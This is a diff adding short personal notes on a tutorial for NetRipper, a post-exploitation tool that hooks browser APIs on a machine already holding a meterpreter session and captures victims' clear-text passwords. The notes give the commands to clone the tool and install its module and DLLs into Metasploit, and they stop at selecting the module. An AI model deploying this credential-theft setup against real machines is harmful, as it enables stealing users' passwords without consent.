@@ -1,0 +1,21 @@
+Dumping Clear-Text Passwords from Browsers using NetRipper
+https://www.hackingarticles.in/dumping-clear-text-passwords-from-browsers-using-netripper/
+
+In the case of Web Browser, suppose the victim is browsing a particular Web Service. He/she enters their credentials in a form created on the Web Page. The data on this form is supposed to be encrypted and carried to the 
+Host Server with the help of a Web Service or API. The NetRipper hooks to that particular API and reads the credentials that are was carrying and then stores the data back into the Victim’s system
+
+Post Exploitation tool (first it need to has meterpreter access) 
+If you want to build the binary from scratch then check the release notes for info. Now to being, cloned the entire git to my attacker machine.
+
+#git clone http://github.com/NytroRST/NetRipper.git
+
+need to run a series of commands so that we can access the NetRipper from the Metasploit Framework.
+cd netripper
+netripper#mkdir /usr/share/metasploit-framework/modules/post/windows/gather/netripper
+netripper#cp Metasploit/netripper.rb /usr/share/metasploit-framework/modules/post/windows/gather/netripper/netripper.rb
+netripper#cp x86/DLL.x86.dll /usr/share/metasploit-framework/modules/post/windows/gather/netripper/DLL.x86.dll
+netripper#cp x64/DLL.x64.dll /usr/share/metasploit-framework/modules/post/windows/gather/netripper/DLL.x64.dll
+
+Since we added modules into the Metasploit Framework, to load those, we need to run reload_all command in the Metasploit shell
+msf > reload_all
+use post/windows/gather/netripper/netripper
